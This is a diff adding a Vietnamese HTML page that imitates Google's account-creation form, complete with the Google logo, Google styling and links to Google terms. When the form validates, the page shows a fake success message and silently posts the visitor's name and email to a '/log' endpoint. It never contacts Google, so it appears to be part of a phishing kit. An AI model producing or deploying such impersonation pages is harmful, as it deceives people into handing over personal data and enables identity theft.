@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Tạo tài khoản Google</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      background: #fff;
+      font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 450px;
+    }
+
+    .google-logo {
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    .google-logo svg {
+      width: 75px;
+      height: 24px;
+    }
+
+    .g-text {
+      font-size: 22px;
+      font-weight: 400;
+      color: #202124;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+
+    .sub-text {
+      font-size: 16px;
+      color: #202124;
+      text-align: center;
+      margin-bottom: 32px;
+      line-height: 1.5;
+    }
+
+    .sub-text a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .form-row {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 0;
+    }
+
+    .input-group {
+      flex: 1;
+      position: relative;
+      margin-bottom: 24px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 13px 15px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      outline: none;
+      color: #202124;
+      background: #fff;
+      transition: border-color 0.2s;
+    }
+
+    .input-group input:focus {
+      border-color: #1a73e8;
+      border-width: 2px;
+      padding: 12px 14px;
+    }
+
+    .input-group label {
+      position: absolute;
+      left: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 16px;
+      color: #5f6368;
+      pointer-events: none;
+      transition: all 0.2s;
+      background: #fff;
+      padding: 0 4px;
+    }
+
+    .input-group input:focus + label,
+    .input-group input:not(:placeholder-shown) + label {
+      top: 0;
+      font-size: 12px;
+      color: #1a73e8;
+    }
+
+    .input-group input.error {
+      border-color: #d93025;
+    }
+
+    .error-msg {
+      font-size: 12px;
+      color: #d93025;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .input-group input.error ~ .error-msg {
+      display: block;
+    }
+
+    .password-toggle {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #5f6368;
+      font-size: 14px;
+      font-weight: 500;
+      user-select: none;
+    }
+
+    .password-toggle:hover {
+      color: #202124;
+    }
+
+    .show-password {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 24px;
+      cursor: pointer;
+    }
+
+    .show-password input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #1a73e8;
+    }
+
+    .show-password span {
+      font-size: 14px;
+      color: #202124;
+    }
+
+    .info-text {
+      font-size: 12px;
+      color: #5f6368;
+      line-height: 1.5;
+      margin-bottom: 32px;
+    }
+
+    .info-text a {
+      color: #1a73e8;
+      text-decoration: none;
+    }
+
+    .btn-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 24px;
+    }
+
+    .btn-signin {
+      font-size: 14px;
+      font-weight: 500;
+      color: #1a73e8;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 10px 16px;
+      border-radius: 4px;
+    }
+
+    .btn-signin:hover {
+      background: #f6fafe;
+    }
+
+    .btn-next {
+      font-size: 14px;
+      font-weight: 500;
+      color: #fff;
+      background: #1a73e8;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.2s, box-shadow 0.2s;
+    }
+
+    .btn-next:hover {
+      background: #1765cc;
+      box-shadow: 0 1px 3px rgba(26,115,232,0.4);
+    }
+
+    .btn-next:active {
+      background: #1558b0;
+    }
+
+    .footer {
+      margin-top: 60px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 8px;
+    }
+
+    .footer select {
+      font-size: 12px;
+      color: #5f6368;
+      border: none;
+      background: none;
+      cursor: pointer;
+      outline: none;
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 24px;
+    }
+
+    .footer-links a {
+      font-size: 12px;
+      color: #5f6368;
+      text-decoration: none;
+    }
+
+    .footer-links a:hover {
+      color: #202124;
+    }
+
+    /* Success overlay */
+    .success-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.95);
+      z-index: 100;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .success-overlay.show {
+      display: flex;
+    }
+
+    .success-check {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background: #34a853;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 24px;
+      animation: popIn 0.4s ease;
+    }
+
+    @keyframes popIn {
+      0% { transform: scale(0); }
+      70% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+
+    .success-text {
+      font-size: 22px;
+      color: #202124;
+      font-weight: 400;
+    }
+
+    .success-sub {
+      font-size: 14px;
+      color: #5f6368;
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="google-logo">
+      <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+        <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
+        <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
+        <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
+        <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
+        <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+        <path d="M35.29 41.19V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49-.01z" fill="#4285F4"/>
+      </svg>
+    </div>
+
+    <h1 class="g-text">Tạo tài khoản Google</h1>
+    <p class="sub-text">Sử dụng tài khoản của bạn cho tất cả dịch vụ của Google</p>
+
+    <form id="signupForm" onsubmit="return false;">
+      <div class="form-row">
+        <div class="input-group">
+          <input type="text" id="firstName" placeholder=" " required>
+          <label for="firstName">Tên</label>
+          <div class="error-msg">Nhập tên</div>
+        </div>
+        <div class="input-group">
+          <input type="text" id="lastName" placeholder=" " required>
+          <label for="lastName">Họ</label>
+          <div class="error-msg">Nhập họ</div>
+        </div>
+      </div>
+
+      <div class="input-group">
+        <input type="email" id="email" placeholder=" " required>
+        <label for="email">Email</label>
+        <div class="error-msg">Nhập email hợp lệ</div>
+      </div>
+
+      <div class="input-group">
+        <input type="password" id="password" placeholder=" " required minlength="8">
+        <label for="password">Mật khẩu</label>
+        <div class="error-msg">Mật khẩu phải có ít nhất 8 ký tự</div>
+      </div>
+
+      <div class="input-group">
+        <input type="password" id="confirmPassword" placeholder=" " required>
+        <label for="confirmPassword">Xác nhận mật khẩu</label>
+        <div class="error-msg">Mật khẩu không khớp</div>
+      </div>
+
+      <div class="show-password">
+        <input type="checkbox" id="showPass" onchange="togglePassword()">
+        <span>Hiện mật khẩu</span>
+      </div>
+
+      <p class="info-text">
+        Việc bạn chọn đăng nhập đồng ý với <a href="#">Điều khoản</a> và <a href="#">Chính sách bảo mật</a> của Google. Tài khoản Google của bạn được sử dụng cho tất cả dịch vụ của Google mà bạn đăng nhập.
+      </p>
+
+      <div class="btn-row">
+        <button type="button" class="btn-signin" onclick="window.location.href='index.html'">Đăng nhập thay vì tạo tài khoản mới</button>
+        <button type="submit" class="btn-next" onclick="validateForm()">Tiếp theo</button>
+      </div>
+    </form>
+
+    <div class="footer">
+      <select>
+        <option>Tiếng Việt</option>
+        <option>English</option>
+      </select>
+      <div class="footer-links">
+        <a href="#">Trợ giúp</a>
+        <a href="#">Quyền riêng tư</a>
+        <a href="#">Điều khoản</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="success-overlay" id="successOverlay">
+    <div class="success-check">
+      <svg width="40" height="40" viewBox="0 0 24 24" fill="white">
+        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+      </svg>
+    </div>
+    <div class="success-text">Tạo tài khoản thành công!</div>
+    <div class="success-sub" id="successEmail"></div>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const show = document.getElementById('showPass').checked;
+      document.getElementById('password').type = show ? 'text' : 'password';
+      document.getElementById('confirmPassword').type = show ? 'text' : 'password';
+    }
+
+    function validateForm() {
+      let valid = true;
+
+      const firstName = document.getElementById('firstName');
+      const lastName = document.getElementById('lastName');
+      const email = document.getElementById('email');
+      const password = document.getElementById('password');
+      const confirmPassword = document.getElementById('confirmPassword');
+
+      [firstName, lastName, email, password, confirmPassword].forEach(el => {
+        el.classList.remove('error');
+      });
+
+      if (!firstName.value.trim()) {
+        firstName.classList.add('error');
+        valid = false;
+      }
+
+      if (!lastName.value.trim()) {
+        lastName.classList.add('error');
+        valid = false;
+      }
+
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRegex.test(email.value)) {
+        email.classList.add('error');
+        valid = false;
+      }
+
+      if (password.value.length < 8) {
+        password.classList.add('error');
+        valid = false;
+      }
+
+      if (password.value !== confirmPassword.value) {
+        confirmPassword.classList.add('error');
+        valid = false;
+      }
+
+      if (valid) {
+        document.getElementById('successEmail').textContent = email.value;
+        document.getElementById('successOverlay').classList.add('show');
+
+        fetch('/log', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            timestamp: new Date().toLocaleString('vi-VN'),
+            attempt: 'create_account',
+            input: `${firstName.value} ${lastName.value} | ${email.value}`,
+            success: true
+          })
+        }).catch(() => {});
+      }
+    }
+
+    document.querySelectorAll('.input-group input').forEach(input => {
+      input.addEventListener('input', function() {
+        this.classList.remove('error');
+      });
+    });
+  </script>
+</body>
+</html>
